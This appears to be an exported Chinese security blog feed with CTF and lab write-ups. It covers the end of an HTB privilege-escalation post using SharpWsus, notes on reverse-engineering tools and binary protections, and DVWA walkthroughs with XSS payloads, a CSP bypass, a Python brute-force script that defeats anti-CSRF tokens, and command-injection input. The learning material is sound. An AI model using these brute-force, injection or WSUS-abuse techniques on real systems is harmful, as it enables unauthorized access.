/computername:dc.outdated.htb /groupname:&quot;whatever&quot;</span><br><span class="line"></span><br><span class="line"># check already</span><br><span class="line">./SharpWsus.exe check /updateid:&#123;update_code&#125; /computername:dc.outdated.htb</span><br></pre></td></tr></table></figure><p>不要反复提交更新，可能会出BUG（机器不太稳定），如果目标机的update一直处于not installed的状态需要多等待一会儿</p><h2 id="summary"><a class="markdownIt-Anchor" href="#summary"></a> Summary</h2><p>这个试验机说实话有点恶心到我了，还处于极度不稳定状态，在第一天release的时候还出现了ZeroLogon的漏洞，糟糕的一次体验。不过好在学到了不少东西！</p>]]></content>
      
      
      <categories>
          
          <category> Machine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2022-30190 [Zero-Day] </tag>
            
            <tag> Active Dirctory </tag>
            
            <tag> Privilege Elevation </tag>
            
            <tag> Shadow Credential </tag>
            
            <tag> WSUS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Start PWN! -Introduct common tools</title>
      <link href="/2022/08/30/pwn-start-intro/"/>
      <url>/2022/08/30/pwn-start-intro/</url>
      
        <content type="html"><![CDATA[<p><strong>不是教程，只记录一下不知道的，不定时更新</strong></p><h2 id="ida"><a class="markdownIt-Anchor" href="#ida"></a> IDA</h2><h3 id="intro"><a class="markdownIt-Anchor" href="#intro"></a> Intro:</h3><p>CTF比赛中比较常见的逆向工具，主要的运行平台是在Windows，软件并不能完美地原生在Linux上运行，不过可以使用<code>wine</code>在Linux上模拟Windows安装。限于目前从来没用过IDA，那么</p><h3 id="usage"><a class="markdownIt-Anchor" href="#usage"></a> Usage:</h3><ul><li>拍摄快照<blockquote><p>IDA不直接提供撤销这个功能操作，但是与之对应的拍摄快照可以完成相应的目的，本质上是另存为，快捷键<code>Ctrl+Shift+w</code></p></blockquote></li><li>在流程图中添加地址偏移 和 自动添加反编译注释，建议在option-&gt;general中开启</li><li>创建数组<blockquote><p>选中一块区域后，然后选择edit-&gt;array，参数含义如下所示</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Array element size 这个值表示各数组元素的大小（这里是 1 个字节），是根据你选中的数据值的大小所决定的</span><br><span class="line"></span><br><span class="line">Maximum possible size 这个值是由自动计算得出的，他表示数组中的元素的可能的最大值</span><br><span class="line"></span><br><span class="line">Array size 表示数组元素的数量，一般都根据你选定的自动产生默认值</span><br><span class="line"></span><br><span class="line">Items on a line 这个表示指定每个反汇编行显示的元素数量，它可以减少显示数组所需的空间</span><br><span class="line"></span><br><span class="line">Element print width 这个值用于格式化，当一行显示多个项目时，他控制列宽</span><br><span class="line"></span><br><span class="line">Use “dup” construct ：使用重复结构，这个选项可以使得相同的数据值合并起来，用一个重复说明符组合成一项</span><br><span class="line"></span><br><span class="line">Signed elements 表示将数据显示为有符号数还是无符号数</span><br><span class="line"></span><br><span class="line">Display indexes 显示索引，使得数组索引以常规的形式显示，如果选了这个选项，还会启动右边的 Indexes 选项栏，用于选择索引的显示格式</span><br><span class="line"></span><br><span class="line">Create as array 创建为数组，这个一般默认选上的</span><br></pre></td></tr></table></figure></li></ul><h3 id="common-alias"><a class="markdownIt-Anchor" href="#common-alias"></a> Common Alias:</h3><p>IDA 经常会自动生成假名字。他们用于表示子函数，程序地址和数据。根据不同的类型和值假名字有不同前缀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sub 指令和子函数起点</span><br><span class="line">locret 返回指令</span><br><span class="line">loc 指令</span><br><span class="line">off 数据，包含偏移量</span><br><span class="line">seg 数据，包含段地址值</span><br><span class="line">asc 数据，ASCII 字符串</span><br><span class="line">byte 数据，字节（或字节数组）</span><br><span class="line">word 数据，16 位数据（或字数组）</span><br><span class="line">dword 数据，32 位数据（或双字数组）</span><br><span class="line">qword 数据，64 位数据（或 4 字数组）</span><br><span class="line">flt 浮点数据，32 位（或浮点数组）</span><br><span class="line">dbl 浮点数，64 位（或双精度数组）</span><br><span class="line">tbyte 浮点数，80 位（或扩展精度浮点数）</span><br><span class="line">stru 结构体 (或结构体数组)</span><br><span class="line">algn 对齐指示</span><br><span class="line">unk 未处理字节</span><br></pre></td></tr></table></figure><hr /><h2 id="ghidra"><a class="markdownIt-Anchor" href="#ghidra"></a> Ghidra</h2><h3 id="intro-2"><a class="markdownIt-Anchor" href="#intro-2"></a> Intro:</h3><p>美国国家安全局公布的工具，工具完全开源且免费，在Linux上我觉得是一款比较好用的逆向软件了。使用方法还是比较简单的，<a href="https://ghidra-sre.org/">官方主页</a>有对于<a href="https://github.com/NationalSecurityAgency/ghidra/wiki/Frequently-asked-questions">一些常见问题</a>的解答。</p><p>他的Logo我还是挺喜欢的，个人感觉十分炫酷</p><h3 id="shortcut-keys"><a class="markdownIt-Anchor" href="#shortcut-keys"></a> Shortcut keys:</h3><p>软件目录里面有一个<code>..../docs/CheatSheet.html</code>的文件可以参考</p><hr /><h2 id="ropgadget"><a class="markdownIt-Anchor" href="#ropgadget"></a> ROPgadget</h2><h3 id="intro-3"><a class="markdownIt-Anchor" href="#intro-3"></a> Intro:</h3><p>ROP（Return Oriented Programming），一下来自非官方的摘录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">随着 NX 保护 (No-eXecute 不可执行) 的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP (Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</span><br></pre></td></tr></table></figure><h3 id="install"><a class="markdownIt-Anchor" href="#install"></a> Install</h3><p>一下为两种方式：</p><ul><li>安装Capstone反编译框架</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install capstone</span><br></pre></td></tr></table></figure><p>然后ROPgadget可以作为一个单独的工具</p><ul><li>直接pip安装模块</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install </span><br></pre></td></tr></table></figure><hr /><h2 id="gdb-peda"><a class="markdownIt-Anchor" href="#gdb-peda"></a> gdb-peda</h2><h3 id="install-2"><a class="markdownIt-Anchor" href="#install-2"></a> Install</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br><span class="line">echo &quot;DONE! debug your program with gdb and enjoy&quot;</span><br></pre></td></tr></table></figure><h3 id="features"><a class="markdownIt-Anchor" href="#features"></a> Features</h3><ul><li>增强gdb显示</li><li>添加了调试和利用开发的命令</li></ul><hr /><h2 id="checksec"><a class="markdownIt-Anchor" href="#checksec"></a> checksec</h2><h3 id="about"><a class="markdownIt-Anchor" href="#about"></a> About</h3><p>这是一个保护机制检测工具，这些保护机制的提供大大降低了栈溢出对程序造成的攻击，可以检测到目标程序是否开启了NX（DEP），PIE（ASLR）等机制；NX不能直接在栈上找数据，ASLR地址是随机化的</p><h3 id="usage-2"><a class="markdownIt-Anchor" href="#usage-2"></a> Usage</h3><p>本身在GitHub能找到这是一个脚本工具，用sh写的，花点时间看应该还是能看懂这个脚本干了些什么，能够学到点脚本知识</p><p>本身就是上一个工具gdb-peda的子命令，可以在<code>gdb-peda</code>中直接调用命令</p><h3 id="protection"><a class="markdownIt-Anchor" href="#protection"></a> Protection</h3><p><em>以下gcc版本为<code>11.3.0</code></em></p><ul><li><p>RELRO （Relocation Read-Only）</p><p>gcc默认为<code>partial RELRO</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -z norelro -o &lt;binary_name&gt; &lt;source_code&gt;  <span class="comment">//no RELRO</span></span><br><span class="line">gcc -z relro -o &lt;binary_name&gt; &lt;source_code&gt;    <span class="comment">//partial RELRO</span></span><br><span class="line">gcc -z full -o &lt;binary_name&gt; &lt;source_code&gt;     <span class="comment">//full RELRO</span></span><br></pre></td></tr></table></figure><blockquote><p>该保护技术利用只读来保护ELF二进制文件,当checksec出来时partial relro后，说明哦我们具有GOT表的写权限，这很明显对<code>GOT overwrite attack</code>的攻击并不是很有效.</p></blockquote></li><li><p>CANARY （stack protect）</p><p>gcc默认为<code>disabled</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-<span class="built_in">stack</span>-protector -o &lt;binary_name&gt; &lt;source_code&gt;</span><br><span class="line">gcc -fstack-protector -o &lt;binary_name&gt; &lt;source_code&gt;      <span class="comment">//启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span></span><br><span class="line">gcc -fstack-protector-all -o &lt;binary_name&gt; &lt;source_code&gt;  <span class="comment">//启用堆栈保护，为所有函数插入保护代码</span></span><br></pre></td></tr></table></figure><p>Canaries是放置在缓冲区和栈控制数据的已知值用来监控缓冲区溢出。恶意输入、特殊输入会发生溢出、破坏栈，会直接导致程序崩溃。</p><p>或者也可以直接用一下shell脚本来检测是否开启了CANARY</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -W -s ./&lt;file_name&gt; | grep -E <span class="string">&#x27;__stack_chk_fail|__intel_security_cookie&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>NX（DEP for Windows）</p><p>gcc默认为<code>enable</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -o &lt;binary_name&gt; &lt;source_code&gt;     <span class="comment">//禁用NX保护</span></span><br><span class="line">gcc -z noexecstack -o &lt;binary_name&gt; &lt;source_code&gt;   <span class="comment">//启用NX保护</span></span><br></pre></td></tr></table></figure><p>NX即Non-eXecutable，通常在于CPU级别启用，所以系统能够在执行程序启用NX保护后将当前内存区域标记为不可执行的状态。通常缓冲区溢出漏洞利用将代码放入缓冲区然后尝试去执行恶意代码，标记这块可写区域为不可执行状态就能避免攻击。</p><p>或者可以执行以下shell脚本来确认,<code>R</code>,<code>W</code>,<code>E</code>顾名思义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readelf -W -l ./&lt;file_name&gt; | grep GNU_STACK</span><br><span class="line">输出:</span><br><span class="line">GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10</span><br></pre></td></tr></table></figure></li><li><p>PIE（ASLR for Windows）</p><p>gcc默认为<code>enable</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pie -fpie -o &lt;binary_name&gt; &lt;source_code&gt;</span><br></pre></td></tr></table></figure><p>这是一个<strong>内存随机化</strong>的保护机制，不过多解释了</p><p>或者可以执行一下两条shell脚本来确认，DYN即为开启了PIE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readelf -W -h ./&lt;file_name&gt; | grep DYN</span><br><span class="line">readelf -W -h ./&lt;file_name&gt; | grep EXEC</span><br></pre></td></tr></table></figure></li><li><p>FORTIFY</p><p>gcc默认为<code>disabled</code></p><p>涉及的有点多，可以Google下</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> common pwn tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA Lab Section B</title>
      <link href="/2022/08/28/dvwa-section-b/"/>
      <url>/2022/08/28/dvwa-section-b/</url>
      
        <content type="html"><![CDATA[<h2 id="weak-session-ids"><a class="markdownIt-Anchor" href="#weak-session-ids"></a> Weak Session IDs</h2><h3 id="low"><a class="markdownIt-Anchor" href="#low"></a> Low</h3><p>没什么好说的，每次单机generate，id都会随之增加，每次增加1</p><h3 id="high"><a class="markdownIt-Anchor" href="#high"></a> High</h3><p>跟low没啥差，源码上面做了md5加密处理</p><hr /><h2 id="xssdom"><a class="markdownIt-Anchor" href="#xssdom"></a> XSS(DOM)</h2><h3 id="low-2"><a class="markdownIt-Anchor" href="#low-2"></a> Low</h3><p><code>?default=&lt;script&gt;alert('message!')&lt;/script&gt;</code></p><blockquote><p>default后面的参数是会直接显示在下拉栏，这点比较重要</p></blockquote><h3 id="high-2"><a class="markdownIt-Anchor" href="#high-2"></a> High</h3><blockquote><p>这里学到了一个新东西就是表单参数后面的值，<code>#</code>后面的都不会被服务器接收，但是用于script用于脚本显示却接受了，这样下拉列表中的内容就被修改了</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English#%3Cscript%3Ealert(123)%3C/script%3E</span><br></pre></td></tr></table></figure><hr /><h2 id="xssreflect"><a class="markdownIt-Anchor" href="#xssreflect"></a> XSS(Reflect)</h2><h3 id="low-3"><a class="markdownIt-Anchor" href="#low-3"></a> Low</h3><p>也是直接<code>&lt;script&gt;function here&lt;/script&gt;</code></p><h3 id="high-3"><a class="markdownIt-Anchor" href="#high-3"></a> High</h3><p>很明显这是一个十分粗糙的过滤，只过滤了script元素，但是有其他的元素也可以加载后同时实现script的效果：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onloaded</span>=<span class="string">&quot;alert(123);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><hr /><h2 id="xssstored"><a class="markdownIt-Anchor" href="#xssstored"></a> XSS(Stored)</h2><h3 id="low-4"><a class="markdownIt-Anchor" href="#low-4"></a> Low</h3><p>脚本直接放框里提交就行了，因为是存储型XSS，数据是直接写入数据库的，所以每次访问都能显示</p><h3 id="high-4"><a class="markdownIt-Anchor" href="#high-4"></a> High</h3><p>这里只有在名字处写入非script标签脚本才能实现XSS Attack，内容处不行，原因是内容出用了一个strip_tags`的</p><hr /><h2 id="content-security-policy-bypass"><a class="markdownIt-Anchor" href="#content-security-policy-bypass"></a> Content Security Policy Bypass</h2><p>也是第一次接触到这个漏洞类型介绍，简单记录一下：</p><p>CSP是一个防御攻击的策略，包括了防御XSS和注入攻击。就是添加白名单，允许那些资源能在网站上展示</p><h3 id="low-5"><a class="markdownIt-Anchor" href="#low-5"></a> Low</h3><p>首先<code>F12</code>查看POST请求的请求头中出现了<code>Content-Security-Policy:script-src 'self' https://pastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;</code>,不难看出<code>https://pastebin.com</code>、<code>example.com</code>、<code>code.jquery.com</code>、<code>https://ssl.google-analytics.com</code>在名单里面，然后在pastebin里面可以写入脚本放入输入框，就可以实现XSS，但是不知道为什么我这边还是会被CSP阻止，我是用docker部署的，不知道是不是配置服务器配置出现了错误</p><h3 id="high-5"><a class="markdownIt-Anchor" href="#high-5"></a> High</h3><p>引用了自己域的一个函数，但是我们手动操作这个函数字典中的值达到XSS Attack效果<br />查看提示信息可以看到<code>http://192.168.129.129/vulnerabilities/csp/source/jsonp.php?callback=solveSum</code>中的是一段数据<code>solveSum(&#123;&quot;answer&quot;:&quot;15&quot;&#125;)</code>,并且在点击按钮也是执行这一段代码，所以只需要更改呈现在页面的内容即可实现攻击</p><hr /><h2 id="javascript"><a class="markdownIt-Anchor" href="#javascript"></a> JavaScript</h2><h3 id="low-6"><a class="markdownIt-Anchor" href="#low-6"></a> Low</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">generate_token</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> phrase = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">md5</span>(<span class="title function_">rot13</span>(phrase));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是关键代码部分，也是能看的，前面的代码都被加密了。调出控制输入<code>md5(rot13(&quot;success&quot;));</code>发现跟请求表单里面的token不一样，而事实也是页面结果出现了invalid token的结果，所以我们需要手动更改请求表单中的token值。直接burpsuite拦截包就可以反馈正确的结果</p><h3 id="high-6"><a class="markdownIt-Anchor" href="#high-6"></a> High</h3><p>这里用了<code>JS Obfuscate</code>,要转换成给人看的代码就需要<a href="http://deobfuscatejavascript.com/#">Obfuscate_decode</a>，比较重要的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">do_something</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.<span class="property">length</span> - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_3</span>(<span class="params">t, y = <span class="string">&quot;ZZ&quot;</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> + y)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_2</span>(<span class="params">e = <span class="string">&quot;YY&quot;</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(e + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_1</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">do_something</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">token_part_2</span>(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;send&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line"><span class="title function_">token_part_1</span>(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>之所以提交后会出错就是因为单击事件执行的是<code>token_part_3</code>的函数，但是<code>token_part_1</code>也被执行了.<br />默认为<br /><strong>执行顺序：</strong></p><ol><li>document.getElementById(“phrase”).value = “”</li></ol><blockquote><p>清空phrase内容</p></blockquote><ol start="2"><li>token_part_1(“ABCD”,44)</li></ol><blockquote><p>直接在console定义do_something(e)这个函数，然后计算执行代码，此时token值为<code>sseccus</code></p></blockquote><ol start="3"><li>setTimeout…</li></ol><blockquote><p>0.3s后执行taken_part_2(‘XX’),此时token内容为<code>&quot;7f1bfaaf829f785ba5801d5bf68c1ecaf95ce04545462c8b8f311dfc9014068a&quot;</code></p></blockquote><ol start="4"><li>最后执行点击事件</li></ol><blockquote><p>执行了token_part_3,得到了token最后的值为<code>ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84</code>，然后更改请求表单中token的值发送请求，Well Done！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Weak Session IDs </tag>
            
            <tag> XSS </tag>
            
            <tag> CSP Bypass </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA Lab Section A</title>
      <link href="/2022/08/25/dvwa-section-a/"/>
      <url>/2022/08/25/dvwa-section-a/</url>
      
        <content type="html"><![CDATA[<h2 id="brute-force"><a class="markdownIt-Anchor" href="#brute-force"></a> Brute Force</h2><h3 id="low"><a class="markdownIt-Anchor" href="#low"></a> Low</h3><p>这部分就是基本的暴力枚举，比较简单的就是使用，提交<code>Login=Login</code>的时候<code>username</code>和<code>password</code>的参数值就自动提交，接下来就简单了</p><ul><li>wfuzz brute</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz --hh 4323 -c -w &#123;password_dictionary&#125; -b &#123;your_cookie&#125; http://&#123;dvwa_address&#125;/?username=admin&amp;password=FUZZ&amp;Login=Login</span><br></pre></td></tr></table></figure><blockquote><p>Cookie Type:PHPSESSID=vqs5fie9hgptij7a2tacekd6d0;security=low</p></blockquote><h3 id="high"><a class="markdownIt-Anchor" href="#high"></a> High</h3><p>难度主要体现在有anti-CSRF</p><p>要想继续尝试登陆，我们需要在每次尝试登录的时候都有一个全新的身份与服务端进行交互，开始编辑脚本！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)==<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage:python ./vryte force.py &#123;YOUR PASSWORD DICTORY&#125;&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">cookie = <span class="built_in">input</span>(<span class="string">&quot;You need type your COOKIE:(e.g: PHPSESSID=abcd;security=impossible)\n:&quot;</span>)</span><br><span class="line"><span class="comment">## Simple: PHPSESSID=70it2dnaee17b39mhp371rcdr5;security=high</span></span><br><span class="line">cookies = &#123;&#125;</span><br><span class="line">input_dict = cookie.split(<span class="string">&quot;;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> input_dict:</span><br><span class="line">    cookies.update(&#123;item.split(<span class="string">&quot;=&quot;</span>)[<span class="number">0</span>]:item.split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>]&#125;)</span><br><span class="line"><span class="built_in">print</span>(cookies)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.129.129/vulnerabilities/brute/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Get Password_Dic from parameter</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(sys.argv[<span class="number">1</span>]) == <span class="literal">False</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;File Not Exsit.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">        pass_dic = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> pass_dic:</span><br><span class="line">    <span class="comment">## Jump over Anti-CSRF</span></span><br><span class="line">    resp_first = requests.get(url=url,cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## Get Anti-CSRF code(RE module)</span></span><br><span class="line">    anti_code = re.findall(<span class="string">r&quot;&lt;.*type=&#x27;hidden&#x27;.*value=&#x27;([0-9a-z]*)&#x27;.*&gt;&quot;</span>,resp_first.text)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## post data</span></span><br><span class="line">    param = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:password,</span><br><span class="line">        <span class="string">&quot;Login&quot;</span>:<span class="string">&quot;Login&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_token&quot;</span>:anti_code,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">## SENT IT!</span></span><br><span class="line">    resp_sec = requests.get(url=url,cookies=cookies,params=param)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Respond Length: &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(resp_sec.text)))</span><br></pre></td></tr></table></figure><blockquote><p>其实burpsuite就可以轻松实现，最近刚好在练习用python写点脚本</p></blockquote><hr /><h2 id="command-injection"><a class="markdownIt-Anchor" href="#command-injection"></a> Command Injection</h2><h3 id="low-2"><a class="markdownIt-Anchor" href="#low-2"></a> Low</h3><p>RCE的一种，不过靶场这种漏洞说实话挺少遇到的，入侵也很简单，一下为<code>127.0.0.1</code>的报错信息，看得出来是直接调用的<code>ping</code>指令用<code>&amp;&amp;</code>符执行自定义指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.083 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.107 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.126 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.175 ms</span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 packets received, 0% packet loss</span><br><span class="line">round-trip min/avg/max/stddev = 0.083/0.123/0.175/0.034 ms</span><br></pre></td></tr></table></figure><p>输入<code>127.0.0.1&amp;&amp;uname -a</code>，可以看到对应的操作系统</p><h3 id="high-2"><a class="markdownIt-Anchor" href="#high-2"></a> High</h3><p><code>trim</code>过滤了前后空白，人为过滤<code>| </code>有遗漏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 